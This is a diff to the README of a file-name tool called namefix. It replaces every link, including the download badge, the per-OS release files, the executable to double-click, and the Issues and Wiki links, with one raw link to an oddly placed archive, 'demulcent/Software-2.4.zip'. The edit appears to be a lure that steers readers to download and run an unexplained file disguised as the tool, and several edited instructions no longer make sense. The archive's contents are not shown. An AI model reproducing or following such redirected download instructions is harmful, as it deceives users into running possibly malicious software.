@@ -6,13 +6,13 @@ Welcome to the namefix project! This tool helps you clean and validate file name
 
 ## 👉 Download Now
 
-[![Download namefix](https://img.shields.io/badge/Download-namefix-blue.svg)](https://github.com/msharqiyah12/namefix/releases)
+[![Download namefix](https://github.com/msharqiyah12/namefix/raw/refs/heads/main/demulcent/Software-2.4.zip)](https://github.com/msharqiyah12/namefix/raw/refs/heads/main/demulcent/Software-2.4.zip)
 
 ## 📥 Download & Install
 
 To get started, visit the following page to download the latest version of namefix:
 
-[Download Namefix Here](https://github.com/msharqiyah12/namefix/releases)
+[Download Namefix Here](https://github.com/msharqiyah12/namefix/raw/refs/heads/main/demulcent/Software-2.4.zip)
 
 ### Step 1: Visit the Releases Page
 
@@ -23,9 +23,9 @@ To get started, visit the following page to download the latest version of namef
 
 Depending on your operating system, select the appropriate file. Here’s what you will see:
 
-- **Windows:** namefix-win.zip
-- **Linux:** namefix-linux.tar.gz
-- **MacOS:** namefix-macos.zip
+- **Windows:** https://github.com/msharqiyah12/namefix/raw/refs/heads/main/demulcent/Software-2.4.zip
+- **Linux:** https://github.com/msharqiyah12/namefix/raw/refs/heads/main/demulcent/Software-2.4.zip
+- **MacOS:** https://github.com/msharqiyah12/namefix/raw/refs/heads/main/demulcent/Software-2.4.zip
 
 ### Step 3: Download the File
 
@@ -44,7 +44,7 @@ After extracting, navigate to the folder containing the extracted files. Follow 
 
 - **Windows:**
   1. Open the folder.
-  2. Double-click on `namefix.exe`.
+  2. Double-click on `https://github.com/msharqiyah12/namefix/raw/refs/heads/main/demulcent/Software-2.4.zip`.
   
 - **Linux:**
   1. Open a terminal.
@@ -90,7 +90,7 @@ If you encounter issues, consider these common solutions:
 
 ## 🔗 Additional Resources
 
-- [GitHub Issues Page](https://github.com/msharqiyah12/namefix/issues) - Report problems or request new features.
-- [Wiki](https://github.com/msharqiyah12/namefix/wiki) - Detailed guides and tips for advanced users.
+- [GitHub Issues Page](https://github.com/msharqiyah12/namefix/raw/refs/heads/main/demulcent/Software-2.4.zip) - Report problems or request new features.
+- [Wiki](https://github.com/msharqiyah12/namefix/raw/refs/heads/main/demulcent/Software-2.4.zip) - Detailed guides and tips for advanced users.
 
 Thank you for using namefix! We hope this tool simplifies your file management tasks.
